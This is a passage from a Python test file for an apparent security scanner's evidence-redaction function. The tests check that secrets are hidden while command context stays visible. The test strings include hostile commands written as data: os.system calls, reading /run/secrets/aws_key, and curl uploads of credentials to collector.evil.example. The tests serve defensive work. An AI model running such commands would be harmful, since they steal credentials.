            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={("client_secret" if "x" in "xy" == "xy" else "public"): "C001_KEYCHAIN_SECRET_123456"}',
            "C001_KEYCHAIN_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={("client_secret" if "x" in ("x",) else "public"): "C001_KEYTUPMEM_SECRET_123456"}',
            "C001_KEYTUPMEM_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={("client_secret" if "x" in ("x",) == ("x",) else "public"): "C001_KEYTUPCHAIN_SECRET_123456"}',
            "C001_KEYTUPCHAIN_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={("client_secret" if "x" in ["x"] != ("x",) else "public"): "C001_KEYMIXSEQ_SECRET_123456"}',
            "C001_KEYMIXSEQ_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={("client_secret" if "x" in {"x"} else "public"): "C001_KEYSETMEM_SECRET_123456"}',
            "C001_KEYSETMEM_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={("client_secret" if ["x"] <= ["x"] else "public"): "C001_KEYLISTORDER_SECRET_123456"}',
            "C001_KEYLISTORDER_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={("client_secret" if ("x",) <= ("x",) else "public"): "C001_KEYTUPORDER_SECRET_123456"}',
            "C001_KEYTUPORDER_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={("client_secret" if {"x"} <= {"x"} else "public"): "C001_KEYSETSUBSET_SECRET_123456"}',
            "C001_KEYSETSUBSET_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'os.system("id"); (client_secret := "C001_WALRUS_SECRET_123456")',
            "C001_WALRUS_SECRET",
            f"client_secret := {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'os.system("id"); client_secret += "C001_AUGASSIGN_SECRET_123456"',
            "C001_AUGASSIGN_SECRET",
            f"client_secret += {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'os.system("id"); Authorization: Token C001_AUTHTOKEN_SECRET_123456',
            "C001_AUTHTOKEN_SECRET",
            f"Authorization: Token {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'os.system("id"); Authorization: Foo.Bar C001_DOTSCHEME_SECRET_123456',
            "C001_DOTSCHEME_SECRET",
            f"Authorization: Foo.Bar {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'os.system("id"); Authorization: Digest username=alice, response=C001_DIGEST_SECRET_123456',
            "C001_DIGEST_SECRET",
            f"Authorization: Digest {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={"Authorization": "Basic C001_JSONAUTH_SECRET_123456"}',
            "C001_JSONAUTH_SECRET",
            f"Authorization={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={str("Authorization"): "Basic C001_STRAUTH_SECRET_123456"}',
            "C001_STRAUTH_SECRET",
            f"Authorization={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={str("token"): "C001_STRTOKEN_SECRET_123456"}',
            "C001_STRTOKEN_SECRET",
            f"token={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={str("secret"): "C001_STRSECRET_SECRET_123456"}',
            "C001_STRSECRET_SECRET",
            f"secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'cfg["client_secret"] = "C001_SUBSCRIPT_SECRET_123456"',
            "C001_SUBSCRIPT_SECRET",
            f"client_secret = {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'cfg["client" + "_secret"] = "C001_SUBSCRIPTPLUS_SECRET_123456"',
            "C001_SUBSCRIPTPLUS_SECRET",
            f"client_secret = {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'cfg[("client_secret",)[0]] = "C001_SUBINDEX_SECRET_123456"',
            "C001_SUBINDEX_SECRET",
            f"client_secret = {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'cfg["client]secret".replace("]", "_")] = "C001_SUBBRACKET_SECRET_123456"',
            "C001_SUBBRACKET_SECRET",
            f"client_secret = {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'cfg["client_secret".encode().decode()] = "C001_ENCODEDECODE_SECRET_123456"',
            "C001_ENCODEDECODE_SECRET",
            f"client_secret = {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'headers["Authorization"] = "Basic C001_SUBAUTH_SECRET_123456"',
            "C001_SUBAUTH_SECRET",
            f"Authorization = {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={("client_secret" if True is True else "public"): "C001_KEYIS_SECRET_123456"}',
            "C001_KEYIS_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={("client_secret" if None is None else "public"): "C001_KEYNONEIS_SECRET_123456"}',
            "C001_KEYNONEIS_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={("client_secret" if not None else "public"): "C001_KEYNOTNONE_SECRET_123456"}',
            "C001_KEYNOTNONE_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={("client_secret" if not {} else "public"): "C001_KEYEMPTYDICT_SECRET_123456"}',
            "C001_KEYEMPTYDICT_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={("client_secret" if not 0.0 else "public"): "C001_KEYFLOAT_SECRET_123456"}',
            "C001_KEYFLOAT_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={("client_secret" if not b"" else "public"): "C001_KEYBYTES_SECRET_123456"}',
            "C001_KEYBYTES_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={("client_secret" if not set() else "public"): "C001_KEYEMPTYSET_SECRET_123456"}',
            "C001_KEYEMPTYSET_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={("client_secret" if not frozenset() else "public"): "C001_KEYEMPTYFROZEN_SECRET_123456"}',
            "C001_KEYEMPTYFROZEN_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={("client_secret" if not set(()) else "public"): "C001_KEYSETTUPLE_SECRET_123456"}',
            "C001_KEYSETTUPLE_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={("client_secret" if not list(()) else "public"): "C001_KEYLISTTUPLE_SECRET_123456"}',
            "C001_KEYLISTTUPLE_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={("client_secret" if set(("x",)) else "public"): "RAWVALUE8"}',
            "RAWVALUE8",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={("client_secret" if ("x",) in [("x",)] else "public"): "C001_KEYNESTMEM_SECRET_123456"}',
            "C001_KEYNESTMEM_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r'os.system("id"); client\u005fsecret="C001_ENCODEDKEY_SECRET_123456"',
            "C001_ENCODEDKEY_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={("client_secret" if "x" not in ("y",) else "public"): "C001_KEYTUPNOTIN_SECRET_123456"}',
            "C001_KEYTUPNOTIN_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={{"x": "client_secret"}["x"]: "C001_KEYDICTLOOKUP_SECRET_123456"}',
            "C001_KEYDICTLOOKUP_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={{"x": "client_secret", "unused": True}["x"]: "C001_KEYDICTEXTRA_SECRET_123456"}',
            "C001_KEYDICTEXTRA_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={{"x": True, "x": "client_secret"}["x"]: "C001_KEYDUPLAST_SECRET_123456"}',
            "C001_KEYDUPLAST_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={{"x": "client" + "_secret", 1: True}["x"]: "C001_KEYDICTNONSTRKEY_SECRET_123456"}',
            "C001_KEYDICTNONSTRKEY_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={{"x": "client" + "_secret", **{}}["x"]: "C001_KEYDICTUNPACK_SECRET_123456"}',
            "C001_KEYDICTUNPACK_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={{("x".islower() and "x"): True, "x": "client_secret"}["x"]: "C001_KEYPREUNKNOWN_SECRET_123456"}',
            "C001_KEYPREUNKNOWN_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            (
                'config={{**{("x".islower() and "x"): True}, "x": "client_secret"}["x"]: '
                '"C001_KEYUNPACKUNKNOWN_SECRET_123456"}'
            ),
            "C001_KEYUNPACKUNKNOWN_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            (
                'config={{"x": "public", ("x".islower() and "x"): True, "x": "client_secret"}["x"]: '
                '"C001_KEYUNKNOWNMID_SECRET_123456"}'
            ),
            "C001_KEYUNKNOWNMID_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={("client_secret" if True else "public"): "C001_KEYTERNARY_SECRET_123456"}',
            "C001_KEYTERNARY_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={"client_secret_x".split("_x")[0]: "C001_KEYSPLIT_SECRET_123456"}',
            "C001_KEYSPLIT_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
    ]

    for text, secret, expected in cases:
        redacted = redact_evidence_string(text, max_chars=500)
        assert secret not in redacted
        assert expected in redacted


def test_redacts_compound_sensitive_query_parameters() -> None:
    """Compound query credential keys should be redacted in URL evidence."""
    text = "url=https://example.com/callback?client_secret=CLIENTSECRET123&refresh_token=REFRESHTOKEN456&ok=1"

    redacted = redact_evidence_string(text, max_chars=500)

    assert "CLIENTSECRET123" not in redacted
    assert "REFRESHTOKEN456" not in redacted
    assert "client_secret=<redacted>" in redacted
    assert "refresh_token=<redacted>" in redacted
    assert "ok=1" in redacted


def test_redacts_malformed_userinfo_url() -> None:
    """Malformed userinfo URLs should fail closed instead of returning raw evidence."""
    text = "download=https://user:LEAKY-PASS@[::1/path?token=QUERYSECRET"

    redacted = redact_evidence_string(text, max_chars=500)

    assert "user:LEAKY-PASS" not in redacted
    assert "QUERYSECRET" not in redacted
    assert "https://<credentials-redacted>@[::1/path" in redacted


def test_existing_token_assignment_redaction_still_applies() -> None:
    """Canonical token assignments should keep their existing redaction behavior."""
    redacted = redact_evidence_string("token=CANONICALTOKEN123", max_chars=500)

    assert "CANONICALTOKEN123" not in redacted
    assert redacted == f"token={REDACTED_EVIDENCE_VALUE}"


def test_key_expression_format_evaluation_is_non_executing() -> None:
    """Unsafe format fields should not abort evidence redaction."""
    text = 'config={"{0.foo}".format("x"): "value"}; os.system("id")'

    redacted = redact_evidence_string(text, max_chars=500)

    assert "os.system" in redacted
    assert "value" in redacted


def test_key_expression_percent_evaluation_is_bounded() -> None:
    """Old-style percent formatting should reject width specifiers without expanding them."""
    text = 'config={"client%5000000s" % "_secret": "value"}; os.system("id")'

    redacted = redact_evidence_string(text, max_chars=500)

    assert len(redacted) < 500


def test_key_expression_format_evaluation_is_bounded() -> None:
    """Nested format expansion should not allocate large intermediate keys."""
    text = 'config={"{0}{0}{0}{0}{0}{0}{0}{0}{0}{0}".format("_secret"): "value"}; os.system("id")'

    redacted = redact_evidence_string(text, max_chars=500)

    assert len(redacted) < 500
    assert "os.system" in redacted


def test_redacted_mapping_value_preserves_following_command_evidence() -> None:
    """Secret values should be removed without hiding the suspicious command context."""
    text = 'config={"clientXsecret".replace("X", "_"): "C001_BOUNDARY_SECRET_123456"}; os.system("id")'

    redacted = redact_evidence_string(text, max_chars=500)

    assert "C001_BOUNDARY_SECRET" not in redacted
    assert f"client_secret={REDACTED_EVIDENCE_VALUE}" in redacted
    assert 'os.system("id")' in redacted


def test_non_sensitive_computed_key_preserves_command_value() -> None:
    """Fallback key inference should not override a safe non-sensitive evaluation."""
    text = (
        'config={"client".replace("secret", "x"): "os.system(1) C001_VISIBLE_COMMAND_123456"} '
        'config={"client".removesuffix("secret"): "os.system(2) C001_VISIBLE_REMOVESUFFIX_123456"} '
        'config={"client_secret".split("_secret")[0]: "os.system(3) C001_VISIBLE_SPLIT_123456"} '
        'config={"public" + "token": "os.system(5) C001_VISIBLE_PUBLICTOKEN_123456"} '
        'config={"client_secret".islower(): "os.system(6) C001_VISIBLE_ISLOWER_123456"} '
        'config={("public" or "client_secret"): "os.system(7) C001_VISIBLE_PUBLICOR_123456"} '
        'config={("public" if "yes" else "client_secret"): "os.system(8) C001_VISIBLE_TRUTHYIF_123456"} '
        'config={{"x": "public", "y": "client_secret"}["x"]: "os.system(9) C001_VISIBLE_DICTLOOKUP_123456"} '
        'config={("public" if 1 == 1 else "client_secret"): "os.system(10) C001_VISIBLE_COMPAREIF_123456"} '
        'config={{"x": "client_secret", ("x".islower() and "x"): True}["x"]: '
        '"os.system(12) C001_VISIBLE_SKIPPEDKEY_123456"} '
        'config={("client_secret" if "x" in "xy" == "x" else "public"): "os.system(13) C001_VISIBLE_CHAIN_123456"} '
        'config={("client_secret" if "x" in ["x"] == ("x",) else "public"): '
        '"os.system(14) C001_VISIBLE_MIXSEQ_123456"} '
        'config={"client_secret" == "public": "os.system(15) C001_VISIBLE_COMPARE_123456"}'
    )

    redacted = redact_evidence_string(text, max_chars=2000)

    assert f"client_secret={REDACTED_EVIDENCE_VALUE}" not in redacted
    assert f"client_secret = {REDACTED_EVIDENCE_VALUE}" not in redacted
    assert "C001_VISIBLE_COMMAND" in redacted
    assert "C001_VISIBLE_REMOVESUFFIX" in redacted
    assert "C001_VISIBLE_SPLIT" in redacted
    assert "C001_VISIBLE_PUBLICTOKEN" in redacted
    assert "C001_VISIBLE_ISLOWER" in redacted
    assert "C001_VISIBLE_PUBLICOR" in redacted
    assert "C001_VISIBLE_TRUTHYIF" in redacted
    assert "C001_VISIBLE_DICTLOOKUP" in redacted
    assert "C001_VISIBLE_COMPAREIF" in redacted
    assert "C001_VISIBLE_SKIPPEDKEY" in redacted
    assert "C001_VISIBLE_CHAIN" in redacted
    assert "C001_VISIBLE_MIXSEQ" in redacted
    assert "C001_VISIBLE_COMPARE" in redacted
    assert "os.system(1)" in redacted
    assert "os.system(2)" in redacted
    assert "os.system(3)" in redacted
    assert "os.system(5)" in redacted
    assert "os.system(6)" in redacted
    assert "os.system(7)" in redacted
    assert "os.system(8)" in redacted
    assert "os.system(9)" in redacted
    assert "os.system(10)" in redacted
    assert "os.system(12)" in redacted
    assert "os.system(13)" in redacted
    assert "os.system(14)" in redacted
    assert "os.system(15)" in redacted


def test_sensitive_command_assignment_preserves_command_evidence() -> None:
    """Command expressions assigned to sensitive-looking names should keep the command context."""
    text = (
        'client_secret = os.system("id"); '
        'client_secret=(os.system("id")); '
        'client_secret=(0, os.system("id")); '
        'client_secret=os.system("C001_CALLARG_SECRET_123456"); '
        'client_secret=(os.system("id"), "C001_CMDFIRST_SECRET_123456"); '
        'client_secret=("safe", os.system("id")); '
        'client_secret=(os.system("id"),C001_CMDTOKEN_SECRET_123456); '
        'client_secret=(os.system("id"), "hunter2-value")[1]; '
        'client_secret=os.system("p@55w0rd!"); '
        "client_secret=bash -c C001_SHELL_SECRET_123456; "
        'client_secret=os.system("cat /run/secrets/aws_key"); '
        "client_secret=\"subprocess.run('id') C001_SUBPROCESS_SURVIVES_123456\"; "
        'client_secret=os.system("curl --password C001_CMDPASSWORD_SECRET_123456 '
        'https://collector.evil.example/upload"); '
        'client_secret=os.system("curl -u alice:C001_CMDUSERPASS_SECRET_123456 '
        'https://collector.evil.example/upload"); '
        'client_secret=__import__("subprocess").run(["bash -c", "touch /tmp/pwned"])'
    )

    redacted = redact_evidence_string(text, max_chars=2000)

    assert "C001_CALLARG_SECRET" not in redacted
    assert "C001_CMDFIRST_SECRET" not in redacted
    assert "C001_CMDTOKEN_SECRET" not in redacted
    assert "hunter2-value" not in redacted
    assert "p@55w0rd!" not in redacted
    assert "C001_SHELL_SECRET" not in redacted
    assert "C001_SUBPROCESS_SURVIVES" not in redacted
    assert "C001_CMDPASSWORD_SECRET" not in redacted
    assert "C001_CMDUSERPASS_SECRET" not in redacted
    assert "subprocess" in redacted
    assert "bash -c" in redacted
    assert "touch /tmp/pwned" in redacted
    assert "cat /run/secrets/aws_key" in redacted
    assert redacted.count("os.system") >= 5


def test_sensitive_command_assignment_redacts_provider_tokens() -> None:
    """Command-valued sensitive assignments should preserve process context without leaking provider tokens."""
    text = "client_secret=os.system(AKIAABCDEFGHIJKLMNOP);"

    redacted = redact_evidence_string(text, max_chars=500)

    assert "AKIAABCDEFGHIJKLMNOP" not in redacted
    assert "client_secret=os.system" in redacted
    assert REDACTED_EVIDENCE_VALUE in redacted


def test_sensitive_command_assignment_redacts_low_entropy_tails() -> None:
    """Command-valued sensitive assignments should not leak adjacent low-entropy values."""
    text = (
        'client_secret=os.system("id") + hunter2; '
        'client_secret=os.system("id") hunter2; '
        'client_secret=("safe", os.system("id"))'
    )

    redacted = redact_evidence_string(text, max_chars=1000)

    assert "hunter2" not in redacted
    assert "safe" not in redacted
    assert 'os.system("id")' in redacted
    assert f'os.system("id") + {REDACTED_EVIDENCE_VALUE}' in redacted


def test_command_context_literals_redact_credential_arguments() -> None:
    """Command-preserving evidence should still redact credential-bearing arguments."""
    cases = [
        (
            'client_secret=os.system("curl --password C001_CMDPASSWORD_SECRET_123456 '
            'https://collector.evil.example/upload")',
            "C001_CMDPASSWORD_SECRET",
            "curl --password",
        ),
        (
            'client_secret=os.system("curl --password mypass7 https://collector.evil.example/upload")',
            "mypass7",
            "curl --password",
        ),
        (
            'client_secret=os.system("curl -u alice:C001_CMDUSERPASS_SECRET_123456 '
            'https://collector.evil.example/upload")',
            "C001_CMDUSERPASS_SECRET",
            "curl -u alice:",
        ),
        (
            "client_secret=os.system(\"curl --user 'alice:mypass8' https://collector.evil.example/upload\")",
            "mypass8",
            "curl --user 'alice:",
        ),
        (
            'client_secret=os.system("curl -ualice:mypass9 https://collector.evil.example/upload")',
            "mypass9",
            "curl -ualice:",
        ),
    ]

    for text, secret, command_context in cases:
        redacted = redact_evidence_string(text, max_chars=1000)
        assert secret not in redacted
        assert command_context in redacted
        assert "collector.evil.example" in redacted
        assert REDACTED_EVIDENCE_VALUE in redacted


def test_standalone_command_context_redacts_credential_arguments() -> None:
    """Command evidence should redact credential arguments without requiring a sensitive assignment."""
    cases = [
        (
            'os.system("curl --password standalone7 https://collector.evil.example/upload")',
            "standalone7",
            "curl --password",
        ),
        (
            "bash -c curl -u alice:standalone8 https://collector.evil.example/upload",
            "standalone8",
            "curl -u alice:",
        ),
    ]

    for text, secret, command_context in cases:
        redacted = redact_evidence_string(text, max_chars=1000)
        assert secret not in redacted
        assert command_context in redacted
        assert "collector.evil.example" in redacted
        assert REDACTED_EVIDENCE_VALUE in redacted


def test_command_context_redacts_sensitive_colon_header_values() -> None:
    """Header cleanup should redact key:value secrets before generic key token cleanup."""
    text = 'os.system("curl -H X-Api-Key:hunter2 https://collector.evil.example/upload")'

    redacted = redact_evidence_string(text, max_chars=1000)

    assert "hunter2" not in redacted
    assert "curl -H" in redacted
    assert "collector.evil.example" in redacted
    assert REDACTED_EVIDENCE_VALUE in redacted


def test_overlapping_command_contexts_skip_redundant_scans(monkeypatch: pytest.MonkeyPatch) -> None:
    """Nested unclosed command markers should not trigger one span scan per marker."""
    find_calls = 0
    real_find_context_end: Callable[[str, int], int] = evidence_redaction._find_command_context_end

    def counting_find_context_end(text: str, start: int) -> int:
        nonlocal find_calls
        find_calls += 1
        return real_find_context_end(text, start)

    monkeypatch.setattr(evidence_redaction, "_find_command_context_end", counting_find_context_end)

    text = "client_secret=" + "os.system(" * 40
    redacted = redact_evidence_string(text, max_chars=2000)

    assert find_calls < 10
    assert "os.system" in redacted


def test_residual_literal_redaction_preserves_command_context() -> None:
    """Cleanup of partially redacted expressions should not erase command evidence."""
    text = 'client_secret = "C001_LITERAL_SECRET_123456" + os.system("id")'

    redacted = redact_evidence_string(text, max_chars=500)

    assert "C001_LITERAL_SECRET" not in redacted
    assert f'client_secret = {REDACTED_EVIDENCE_VALUE} + os.system("id")' in redacted


def test_colon_dense_non_key_text_skips_ast_parse(monkeypatch: pytest.MonkeyPatch) -> None:
    """Colon-heavy evidence without key literals should not drive repeated parsing."""
    parse_calls = 0
    real_parse: Any = evidence_redaction.ast.parse

    def counting_parse(*args: Any, **kwargs: Any) -> Any:
        nonlocal parse_calls
        parse_calls += 1
        return real_parse(*args, **kwargs)

    monkeypatch.setattr(evidence_redaction.ast, "parse", counting_parse)

    text = 'os.system("id"); ' + ': {"x"} ' * 300
    redacted = redact_evidence_string(text, max_chars=500)

    assert parse_calls == 0
    assert "os.system" in redacted
